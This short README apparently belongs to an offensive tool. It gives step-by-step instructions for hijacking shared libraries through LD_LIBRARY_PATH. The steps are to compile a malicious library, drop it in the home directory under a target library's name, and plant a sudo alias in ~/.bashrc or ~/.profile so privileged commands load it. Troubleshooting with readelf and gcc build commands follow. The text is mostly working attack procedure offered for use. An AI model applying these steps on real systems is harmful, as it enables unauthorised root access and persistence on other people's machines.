# Shared Library Hijacking via `LD_LIBRARY_PATH`

## How to
1. Find your target with `ldd /path/to/the/lib`
2. Compile the library
3. Rename and move your lib to the user path `cp xorLdLibraryPath.so ~/<hijacked lib name>`
4. Add the following line to the `~/.bashrc` or `~/.profile`: `alias sudo="sudo LD_LIBRARY_PATH=/home/<user>"`
5. Run the binary you are trying to perform the library hijacking
> [!NOTE]
> If you got errors like "symbol not defined" and the hijacing isn't working, run `readelf` to get the needed symbols and add them to the source code, than start with step 2 again.
> ```bash
> readelf -s --wide <path/to/the/lib> | grep FUNC | grep <the symbol not defined> | awk '{print "int",$8}'
> ```

## Compilation
```bash
gcc -Wall -fPIC -z execstack -c -o xorLdLibraryPath.o xorLdLibraryPath.c
gcc -shared -o xorLdLibraryPath.so xorLdLibraryPath.o -ldl
```
